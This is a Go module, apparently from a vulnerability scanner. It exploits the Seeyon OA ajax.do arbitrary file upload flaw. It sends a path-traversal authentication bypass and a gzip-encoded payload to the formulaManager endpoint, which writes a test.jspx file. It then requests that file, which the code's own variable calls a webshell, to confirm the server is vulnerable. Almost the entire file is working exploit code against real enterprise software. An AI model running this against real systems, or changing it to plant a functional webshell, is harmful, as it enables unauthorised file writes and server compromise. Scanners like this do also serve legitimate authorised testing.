package A8_ajaxfile_upload

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
)

func Run(targetUrl string) {
	vulnUrl := targetUrl + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"

	headers := map[string]string{
		"User-Agent":   UA,
		"Content-Type": "application/x-www-form-urlencoded",
	}
	data := "managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%03uR%5BS%C3%A20%18%7Dv%7FE%C2%A6%2F-%C2%A3%1B%0A%C2%A2%C2%83%C3%AB%C3%B0+%03B%C2%BD%14%C2%B0%C3%A2%C2%BA%C3%AE%C3%B8%C2%90%C2%A6%29%C2%A4%C3%93%C2%A4%C2%99%26%C2%BD%C3%81%C3%B8%C3%9FM-%2B%C3%8C%C3%A8%C3%A6%C3%A5%C2%BB%C3%A4%3B%27gN%C2%BE%C2%BF%5B3LR%C2%96%C3%85%C3%A8%C2%B1%12%C3%84%C3%BC%05%3A%27%C3%A0_%C3%87E%C2%AC%C3%AE%C2%98%C2%8AHe%C3%AE%C3%9B%C3%A3R%C2%A4DJ%C2%9A%C3%B0%C3%BA%C3%92S%29%C3%A5%2B+%C2%90Z%C2%83%010+l%17%C3%84GB%C3%88%C2%B6%24%C2%A4Jx%C3%9B%C2%B8%C3%BC%01%C2%9As%14%C2%A1%1CA%C2%9A%C3%80%C2%B9%C2%86%C2%A8%C3%9F%29U%24%05b%C2%9Fw5%01%27%05%C3%B8f%C3%8C%C2%AA%C3%B9%C2%8F%C2%8DZ%09%C2%8C%C2%A4%28%C2%8D%C3%96%27%2B%C3%98%29%C2%90k%12%C3%87%C2%B5%C2%84%C3%B9Dl%C3%B0HT%7E%C3%B7%C3%82v%C2%A6k%C3%A5O%C3%8E63V%C3%B7l%C2%8A%C2%A6%0F6%1E%25%C3%B9%5DW%C2%AC%036%C3%8E%C3%B0%C3%A9Sv%C3%87%C3%9C%C3%9C%C3%B7.n%C2%97%C2%9D%C2%AB%7C9%C2%B9%C3%A6%2F%C2%9E%C2%B3%0A%C3%98S%C2%85%C2%BBq%C3%AEG6%C2%BD%C3%B7z%C2%95%13%C3%B5%C3%BA%C2%88%C2%BB%C3%85%C2%8C%C2%BB%11fq%11L%C3%8A8%18%C2%9D%C3%A5%C3%81%C3%B3%22%C3%83%C3%93%1B%C3%A1%C3%B3E%C3%A20%C3%91%C3%81%C2%A7%C2%8B%C3%95%1Foh%C2%BF%3C%C2%BBvH%1D1%C3%9B%14%C3%B9W%5C%C2%AF%C2%AF%C3%9F%C3%BF%C3%948_%0D%06%7B%C2%93%C2%80%C3%8C8dTb8%C2%BC%C3%B2%C3%86%C3%A7%C2%BD%11%C3%81I%C2%A0%7D%0Av%C2%B1%C2%B1%C3%A8%C3%BB%21%C3%AB%C2%AB%2B%0DlW4%C3%98%C2%A6%C2%B0v%C2%84%C2%B0%C2%89%C3%83%2C%0C5%C3%81%C2%87%C2%89%C2%AD%13c%C3%B9x%C3%BD%C2%B3%7Fh%C3%B2%C3%A17%C3%81%C2%8F%22%C3%A6%C3%96%21%C3%B9%C3%BFfq%C2%9CH%C2%A2%C2%85%C2%BD%5D%C3%96%C2%9F%C2%A7%C2%93%C2%80%C2%84%40%2A%C2%A4%28%06eYZ%C2%AD%C2%AD%C3%B9%C2%A6wK%C3%AF%C3%97%C2%B6%C2%8E%2A%C3%8D%C2%88%C3%B9%C3%BA%0E%2B%C3%95%0D%C3%A5%C2%96%02%00%00"

	resp, err := client.R().
		SetHeaders(headers).
		SetBody(data).
		Post(vulnUrl)

	if err != nil {
		color.Red.Println("[-]	致远OA ajax.do 任意文件上传漏洞不存在")
		return
	}

	webshellUrl := targetUrl + "/seeyon/test.jspx"
	resp, err = client.R().
		SetHeaders(headers).
		Get(webshellUrl)

	if err == nil && resp.StatusCode == 200 && strings.Contains(resp.String(), "just a test~") {
		color.Green.Printf("[+]	致远OA ajax.do 任意文件上传漏洞存在 -> %s\n", targetUrl)
	} else {
		color.Red.Println("[-]	致远OA ajax.do 任意文件上传漏洞不存在")
	}
}
